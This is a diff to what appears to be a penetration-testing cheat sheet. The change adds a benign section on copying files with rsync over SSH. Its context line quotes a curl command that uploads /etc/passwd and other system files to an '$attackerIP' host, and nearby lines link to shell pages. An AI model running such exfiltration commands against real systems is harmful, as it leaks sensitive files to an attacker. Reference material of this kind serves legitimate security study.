@@ -147,3 +147,18 @@ curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/
 ## Backdoors
 
 See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).
+
+## Transfer Files with Rsync over SSH
+
+[More about RSYNC protocol](873-rsync.md).
+
+Before you can start transferring files and directories with rsync over SSH, make sure you can [use SSH to connect to a remote server](https://phoenixnap.com/kb/ssh-to-connect-to-remote-server-linux-or-windows). Once verified, you can begin backing up your data. Ensure your destination system has sufficient storage space.
+
+The syntax for copying files to a remote server over SSH with the **`rsync`** command is:
+
+```
+rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target
+
+# Example
+rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test
+```
